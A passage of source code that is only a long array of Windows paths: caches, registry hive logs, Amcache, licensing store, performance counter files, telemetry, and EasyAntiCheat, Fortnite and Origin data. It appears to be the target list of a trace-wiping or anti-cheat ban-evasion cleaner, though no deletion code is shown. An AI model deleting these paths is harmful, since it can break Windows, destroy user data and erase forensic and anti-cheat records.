            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\AsyncStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\DiagOutputDir",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState\\CS_localstate",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\OneSettingsResponseCache",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\DeviceSearchCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\AppIconCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\AppIconCache\\100",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache_idx.db",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\utc.tracing.json.bk",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\utc.tracing.json",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\utc.tracing.json",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\TargetedContentCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\InstallAgent",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\UnistoreDB",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jtx",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd-shm",
            "C:\\ProgramData\\Microsoft\\Windows\\WER",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.IE5",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\History",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\SharedCacheContainers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Feeds Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\History",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.IE5",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects\\SystemIndex\\SecStore",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects\\SystemIndex\\PropMap",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Temp",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\GatherLogs",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects\\SystemIndex\\PropMap",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects\\SystemIndex\\SecStore",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects\\SystemIndex",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache_96.db",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\XSettings.Sav",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\AppCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\ConnectedDevicesPlatform",
            "C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\microsoft.system.package.metadata\\Autogen",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\roaming.lock",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.Cortana_1.11.5.17763_neutral_neutral_cw5n1h2txyewy",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\CacheStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\Internet Explorer\\DOMStore",
            "C:\\Windows\\TEMP\\NVIDIA Corporation\\NV_Cache",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\D3DSCache",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateOrchestrator",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\Indexed DB",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Flighting\\OneSettings",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows",
            "C:\\Users\\"+ user +"\\AppData\\Local\\DBG",
            "C:\\Windows\\System32\\eac_usermode_9472654871434.dll",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\EasyAntiCheat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\TargetedContentCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\AC",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\InstallAgent",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\StagedAssets",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Assets",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-shm",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache_idx.db",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\Settings\\settings.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\DeviceSearchCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState\\CortanaUnifiedTileModelCache.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\AppIconCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios\\WINDOWS.DIAGNOSTICS.xml.temp",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios\\WINDOWS.DIAGNOSTICS.xml",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios\\WINDOWS.DIAGNOSTICS.xml",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios\\WINDOWS.DIAGNOSTICS.xml.new",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\utc.tracing.json",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd-shm",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\CLR_v2.0\\UsageLogs",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\ProgramData\\USOShared\\Logs\\NotificationUxBroker_Temp.1.etl",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.db-wal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.db",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\GatherLogs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation",
            "C:\\Windows\\System32\\config\\BBI.LOG2",
            "C:\\Windows\\System32\\config\\BBI.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\AC",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\UpdateOrchestrator",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\PRICache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Ringtones",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Temp\\VSRemoteControl",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache_256.db",
            "C:\\Windows\\WindowsUpData.dll",
            "C:\\Windows\\WindowsUpData.sys",
            "C:\\recycled",
            "C:\\ProgramData\\Origin",
            "C:\\ProgramData\\Origin\\AchievementCache",
            "C:\\ProgramData\\Origin\\CatalogCache",
            "C:\\ProgramData\\Origin\\CustomBoxartCache",
            "C:\\ProgramData\\Origin\\DownloadCache",
            "C:\\ProgramData\\Origin\\EntitlementCache",
            "C:\\ProgramData\\Origin\\IGOCache",
            "C:\\ProgramData\\Origin\\Logs",
            "C:\\ProgramData\\Origin\\NonOriginContentCache",
            "C:\\ProgramData\\Origin\\SelfUpdate",
            "C:\\ProgramData\\Origin\\Subscription",
            "C:\\ProgramData\\Origin\\Telemetry",
            "E:\\recycled",
            "E:\\ProgramData\\Origin",
            "E:\\ProgramData\\Origin\\AchievementCache",
            "E:\\ProgramData\\Origin\\CatalogCache",
            "E:\\ProgramData\\Origin\\CustomBoxartCache",
            "E:\\ProgramData\\Origin\\DownloadCache",
            "E:\\ProgramData\\Origin\\EntitlementCache",
            "E:\\ProgramData\\Origin\\IGOCache",
            "E:\\ProgramData\\Origin\\Logs",
            "E:\\ProgramData\\Origin\\NonOriginContentCache",
            "E:\\ProgramData\\Origin\\SelfUpdate",
            "E:\\ProgramData\\Origin\\Subscription",
            "E:\\ProgramData\\Origin\\Telemetry",
            "D:\\recycled",
            "D:\\ProgramData\\Origin",
            "D:\\ProgramData\\Origin\\AchievementCache",
            "D:\\ProgramData\\Origin\\CatalogCache",
            "D:\\ProgramData\\Origin\\CustomBoxartCache",
            "D:\\ProgramData\\Origin\\DownloadCache",
            "D:\\ProgramData\\Origin\\EntitlementCache",
            "D:\\ProgramData\\Origin\\IGOCache",
            "D:\\ProgramData\\Origin\\Logs",
            "D:\\ProgramData\\Origin\\NonOriginContentCache",
            "D:\\ProgramData\\Origin\\SelfUpdate",
            "D:\\ProgramData\\Origin\\Subscription",
            "D:\\ProgramData\\Origin\\Telemetry",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Origin",
            "C:\\Windows\\SoftwareDistribution",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs",
            "C:\\Program Files\\WindowsApps\\Microsoft.LanguageExperiencePacken-GB_17763.9.22.0_neutral__8wekyb3d8bbwe\\Windows\\System32\\driverstore",
            "C:\\ProgramData\\Microsoft\\Windows\\ClipSVC",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG1",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG2",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\dosvcState.dat.LOG1",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\dosvcState.dat.LOG2",
            "C:\\Windows\\appcompat\\appraiser\\AltData\\Appraiser_Data.ini",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Safety\\edge\\remote",
            "C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive0.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState\\CortanaUnifiedTileModelCache.dat",
            "C:\\Windows\\Logs\\MoSetup",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\meta.edb",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WER",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\LocalState",
            "C:\\Windows\\System32\\spp\\store",
            "C:\\Windows\\SysWOW64\\Gms.log",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization",
            "C:\\Windows\\System32\\WDI\\LogFiles",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\FontCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\PlaceholderTileLogoFolder",
            "C:\\ProgramData\\Microsoft\\XboxLive\\NSALCache",
            "C:\\Program Files x86\\AMD",
            "C:\\Program Files x86\\AMD\\CNext",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage",
            "C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache",
            "C:\\Users\\"+ user +"\\Videos\\Captures\\desktop.ini",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.db-wal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.db",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\Settings\\settings.dat.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe\\Settings\\settings.dat.LOG2",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd-wal",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Deployment.srd-shm",
            "C:\\ProgramData\\NVIDIA Corporation",
            "C:\\ProgramData\\NVIDIA",
            "C:\\Users\\DefaultAppPool",
            "C:\\Users\\All Users\\NVIDIA Corporation",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy",
            "C:\\Users\\All Users\\Intel",
            "C:\\ProgramData\\Intel",
            "C:\\ProgramData\\Intel",
            "C:\\Windows\\System32\\LogFiles\\WMI\\LwtNetLog.etl",
            "C:\\ProgramData\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache",
            "C:\\Windows\\System32\\LogFiles\\WMI\\Wifi.etl",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy",
            "C:\\ProgramData\\Microsoft\\Windows\\WER",
            "C:\\Users\\All Users\\Microsoft\\Windows\\WER",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.XboxGamingOverlay_3.30.20002.0_x64__8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.XboxGamingOverlay_3.30.20002.0_x64__8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Notifications",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy",
            "C:\\Users\\"+ user +"\\AppData\\Local\\ElevatedDiagnostics",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Speech Graphics\\Carnival",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.IE5",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage",
            "C:\\Program Files x86\\AMD",
            "C:\\ProgramData\\Microsoft\\XboxLive",
            "C:\\Windows\\System32\\perfc009.dat",
            "C:\\Windows\\System32\\perfh009.dat",
            "C:\\Windows\\System32\\PerfStringBackup.TMP",
            "C:\\Windows\\System32\\PerfStringBackup.INI",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\Settings",
            "C:\\Windows\\TEMP",
            "C:\\Windows\\SoftwareDistribution",
            "C:\\Windows\\System32\\WDI\\LogFiles",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Logs",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State",
            "C:\\Windows\\SysWOW64\\Gms.log",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WER",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\Unistore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AppData\\User\\Default\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AppData",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup\\EtwRTGraphicsPerfMonitorSession.etl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\MicrosoftEdge\\User\\Default\\Recovery\\Active",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\User\\Default\\AppCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Windows\\rescache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\settings",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs",
